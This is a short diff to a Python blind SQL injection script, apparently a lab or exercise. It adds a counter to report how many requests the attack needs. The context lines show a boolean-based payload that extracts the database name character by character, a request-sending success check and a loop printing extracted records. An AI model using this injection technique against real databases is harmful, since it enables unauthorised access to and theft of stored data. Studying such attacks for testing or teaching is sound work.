@@ -7,6 +7,8 @@ db_name = ""
 current_table = ""
 current_attr = ""
 
+request_counter = 0
+
 def get_url_lt(idx, ch, url_idx):
     if url_idx == 0:
         return f"alice' AND (SELECT SUBSTRING((SELECT DATABASE()), {idx},1)) < '{ch}"
@@ -61,6 +63,8 @@ def encode_url(url, param):
 
 def is_success(attack_url: str):
     response = requests.get(attack_url, timeout=5.0)
+    global request_counter
+    request_counter += 1
     return response.url != attack_url
 
 
@@ -129,7 +133,9 @@ def main():
             print(f"attr: {attr}: {records}")
     end_time = time.time()
     total_time = end_time - start_time
+    global request_counter
     print(f"Attack took {total_time:.2f} seconds")
+    print(f"Attack required {request_counter} requests")
 
     pass
 
